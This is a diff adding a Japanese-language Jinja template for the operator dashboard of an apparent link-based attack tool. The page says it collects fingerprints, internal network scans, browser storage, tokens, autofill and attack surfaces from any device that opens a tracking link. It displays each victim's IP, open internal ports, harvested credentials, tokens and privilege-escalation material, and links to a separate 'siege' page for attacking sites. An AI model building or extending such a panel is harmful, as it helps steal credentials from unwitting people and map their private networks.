@@ -1,0 +1,25 @@
+{% extends "base.html" %}
+{% block title %}{{ link.name }} — 偵察{% endblock %}
+{% block content %}
+<h1>踏み台偵察 <span class="mono dim">{{ link.code }}</span></h1>
+<p class="dim">踏んだ端末で指紋・網内探索・保存領域・トークン・オートフィル・突破面を全部回収します。サイト攻撃は「攻城」で。</p>
+<div class="card">
+  状態: {{ '有効' if on else '停止中' }}
+  <form method="post" action="/link/{{ link.code }}/redteam/toggle" style="display:inline"><button type="submit">{{ '停止' if on else '有効化' }}</button></form>
+  <a href="/link/{{ link.code }}">詳細</a> <a href="/l/{{ link.code }}" target="_blank">開く</a>
+  <a href="/siege?url=">攻城へ</a>
+</div>
+{% for r in rows %}
+<div class="card">
+  <div><b>{{ r.grade }}</b> {{ r.ts[:19] }} / {{ r.ip }} / {{ r.origin }}</div>
+  {% if r.net %}<div class="dim">網内: {{ r.net.open|join(' ') if r.net.open else '—' }} / WAN: {{ r.net.pub or '—' }}</div>{% endif %}
+  {% if r.creds %}<div><b>認証情報</b><pre>{{ r.creds|tojson(indent=1) }}</pre></div>{% endif %}
+  {% if r.tokens %}<div><b>トークン</b><pre>{{ r.tokens|tojson(indent=1) }}</pre></div>{% endif %}
+  {% if r.findings %}<ul>{% for x in r.findings %}<li>[{{ x.sev }}] {{ x.title }}{% if x.evidence %} <code>{{ x.evidence[:70] }}</code>{% endif %}</li>{% endfor %}</ul>{% endif %}
+  {% if r.priv %}<details><summary>昇格材料 {{ r.priv|length }}件</summary><pre>{{ r.priv|tojson(indent=1) }}</pre></details>{% endif %}
+  {% if r.storage %}<details><summary>保存領域</summary><pre>{{ r.storage|tojson(indent=1) }}</pre></details>{% endif %}
+  {% if r.fp %}<details><summary>指紋</summary><pre>{{ r.fp|tojson(indent=1) }}</pre></details>{% endif %}
+</div>
+{% else %}<p class="dim">まだありません。</p>{% endfor %}
+<form method="post" action="/link/{{ link.code }}/redteam/clear" onsubmit="return confirm('消す？')"><button type="submit">削除</button></form>
+{% endblock %}
